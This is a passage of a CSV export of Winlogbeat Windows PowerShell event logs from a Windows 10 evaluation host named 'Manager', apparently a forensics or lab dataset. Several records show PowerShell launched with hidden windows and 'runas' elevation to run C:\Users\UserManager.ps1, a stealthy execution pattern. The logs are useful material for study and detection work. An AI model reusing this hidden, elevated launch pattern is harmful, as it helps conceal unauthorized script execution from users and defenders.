	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Function,"-","-","-","-",Started,"-","-","-","	ProviderName=Function
	NewProviderState=Started

	SequenceNumber=9

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=cae13c18-4ed0-44a7-96d4-5b0cd1379ac0
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden start-process powershell -verb runas -windowstyle hidden -ArgumentList C:\Users\UserManager.ps1
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,6197,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:06:15.974",GnkXBIQByII7dpeEwS3z,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 17:06:16.986","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Variable"" is Started. 

Details: 
	ProviderName=Variable
	NewProviderState=Started

	SequenceNumber=11

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=cae13c18-4ed0-44a7-96d4-5b0cd1379ac0
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden start-process powershell -verb runas -windowstyle hidden -ArgumentList C:\Users\UserManager.ps1
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Variable,"-","-","-","-",Started,"-","-","-","	ProviderName=Variable
	NewProviderState=Started

	SequenceNumber=11

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=cae13c18-4ed0-44a7-96d4-5b0cd1379ac0
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden start-process powershell -verb runas -windowstyle hidden -ArgumentList C:\Users\UserManager.ps1
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,6198,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:06:14.409",AHkXBIQByII7dpeEuS1W,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 17:06:14.780","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Certificate"" is Started. 

Details: 
	ProviderName=Certificate
	NewProviderState=Started

	SequenceNumber=15

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=faa344c5-f572-4680-b6ae-44cbf2c764b3
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=5.1.19041.1682
	RunspaceId=006610ef-40e1-4c2e-b82e-7925928eed3f
	PipelineId=10
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Certificate,"-","-","-","-",Started,"-","-","-","	ProviderName=Certificate
	NewProviderState=Started

	SequenceNumber=15

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=faa344c5-f572-4680-b6ae-44cbf2c764b3
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=5.1.19041.1682
	RunspaceId=006610ef-40e1-4c2e-b82e-7925928eed3f
	PipelineId=10
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,6192,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:06:13.667",93kXBIQByII7dpeEtSxh,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","Engine Lifecycle","-",400,"Oct 23, 2022 @ 17:06:13.778","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Engine state is changed from None to Available. 

Details: 
	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=faa344c5-f572-4680-b6ae-44cbf2c764b3
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=5.1.19041.1682
	RunspaceId=006610ef-40e1-4c2e-b82e-7925928eed3f
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Available,"-","-","-","-",None,"-","-","-","	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=faa344c5-f572-4680-b6ae-44cbf2c764b3
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=5.1.19041.1682
	RunspaceId=006610ef-40e1-4c2e-b82e-7925928eed3f
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",400,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,6191,"Engine Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:06:13.605",8XkXBIQByII7dpeEtSxh,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 17:06:13.777","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Registry"" is Started. 

Details: 
	ProviderName=Registry
	NewProviderState=Started

	SequenceNumber=1

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=faa344c5-f572-4680-b6ae-44cbf2c764b3
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Registry,"-","-","-","-",Started,"-","-","-","	ProviderName=Registry
	NewProviderState=Started

	SequenceNumber=1

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=faa344c5-f572-4680-b6ae-44cbf2c764b3
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,6185,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:06:13.605",8nkXBIQByII7dpeEtSxh,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 17:06:13.778","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Alias"" is Started. 

Details: 
	ProviderName=Alias
	NewProviderState=Started

	SequenceNumber=3

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=faa344c5-f572-4680-b6ae-44cbf2c764b3
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Alias,"-","-","-","-",Started,"-","-","-","	ProviderName=Alias
	NewProviderState=Started

	SequenceNumber=3

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=faa344c5-f572-4680-b6ae-44cbf2c764b3
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,6186,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:06:13.605",83kXBIQByII7dpeEtSxh,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 17:06:13.778","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Environment"" is Started. 

Details: 
	ProviderName=Environment
	NewProviderState=Started

	SequenceNumber=5

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=faa344c5-f572-4680-b6ae-44cbf2c764b3
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Environment,"-","-","-","-",Started,"-","-","-","	ProviderName=Environment
	NewProviderState=Started

	SequenceNumber=5

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=faa344c5-f572-4680-b6ae-44cbf2c764b3
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,6187,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:06:13.605",9HkXBIQByII7dpeEtSxh,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 17:06:13.778","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""FileSystem"" is Started. 

Details: 
	ProviderName=FileSystem
	NewProviderState=Started

	SequenceNumber=7

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=faa344c5-f572-4680-b6ae-44cbf2c764b3
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",FileSystem,"-","-","-","-",Started,"-","-","-","	ProviderName=FileSystem
	NewProviderState=Started

	SequenceNumber=7

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=faa344c5-f572-4680-b6ae-44cbf2c764b3
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,6188,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:06:13.605",9XkXBIQByII7dpeEtSxh,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 17:06:13.778","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Function"" is Started. 

Details: 
	ProviderName=Function
	NewProviderState=Started

	SequenceNumber=9

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=faa344c5-f572-4680-b6ae-44cbf2c764b3
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Function,"-","-","-","-",Started,"-","-","-","	ProviderName=Function
	NewProviderState=Started

	SequenceNumber=9

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=faa344c5-f572-4680-b6ae-44cbf2c764b3
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,6189,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:06:13.605",9nkXBIQByII7dpeEtSxh,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 17:06:13.778","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Variable"" is Started. 

Details: 
	ProviderName=Variable
	NewProviderState=Started

	SequenceNumber=11

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=faa344c5-f572-4680-b6ae-44cbf2c764b3
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Variable,"-","-","-","-",Started,"-","-","-","	ProviderName=Variable
	NewProviderState=Started

	SequenceNumber=11

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=faa344c5-f572-4680-b6ae-44cbf2c764b3
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,6190,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:05:55.168",eHkXBIQByII7dpeEbSzc,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","Engine Lifecycle","-",400,"Oct 23, 2022 @ 17:05:55.467","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Engine state is changed from None to Available. 

Details: 
	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=e743b4bb-1089-4493-ba46-78d4e0a26433
	HostApplication=powershell
	EngineVersion=5.1.19041.1682
	RunspaceId=c65bc50a-5509-40ab-a28a-90a26ec8fefc
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Available,"-","-","-","-",None,"-","-","-","	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=e743b4bb-1089-4493-ba46-78d4e0a26433
	HostApplication=powershell
	EngineVersion=5.1.19041.1682
	RunspaceId=c65bc50a-5509-40ab-a28a-90a26ec8fefc
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",400,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,6184,"Engine Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:05:55.122",dXkXBIQByII7dpeEbSzc,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 17:05:55.467","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""FileSystem"" is Started. 

Details: 
	ProviderName=FileSystem
	NewProviderState=Started

	SequenceNumber=7

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=e743b4bb-1089-4493-ba46-78d4e0a26433
	HostApplication=powershell
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",FileSystem,"-","-","-","-",Started,"-","-","-","	ProviderName=FileSystem
	NewProviderState=Started

	SequenceNumber=7

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=e743b4bb-1089-4493-ba46-78d4e0a26433
	HostApplication=powershell
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,6181,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:05:55.122",dnkXBIQByII7dpeEbSzc,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 17:05:55.467","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Function"" is Started. 

Details: 
	ProviderName=Function
	NewProviderState=Started

	SequenceNumber=9

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=e743b4bb-1089-4493-ba46-78d4e0a26433
	HostApplication=powershell
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Function,"-","-","-","-",Started,"-","-","-","	ProviderName=Function
	NewProviderState=Started

	SequenceNumber=9

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=e743b4bb-1089-4493-ba46-78d4e0a26433
	HostApplication=powershell
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,6182,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:05:55.122",d3kXBIQByII7dpeEbSzc,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 17:05:55.467","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Variable"" is Started. 

Details: 
	ProviderName=Variable
	NewProviderState=Started

	SequenceNumber=11

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=e743b4bb-1089-4493-ba46-78d4e0a26433
	HostApplication=powershell
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Variable,"-","-","-","-",Started,"-","-","-","	ProviderName=Variable
	NewProviderState=Started

	SequenceNumber=11

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=e743b4bb-1089-4493-ba46-78d4e0a26433
	HostApplication=powershell
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,6183,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:05:55.106",cnkXBIQByII7dpeEbSzc,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 17:05:55.467","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Registry"" is Started. 

Details: 
	ProviderName=Registry
	NewProviderState=Started

	SequenceNumber=1

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=e743b4bb-1089-4493-ba46-78d4e0a26433
	HostApplication=powershell
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Registry,"-","-","-","-",Started,"-","-","-","	ProviderName=Registry
	NewProviderState=Started

	SequenceNumber=1

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=e743b4bb-1089-4493-ba46-78d4e0a26433
	HostApplication=powershell
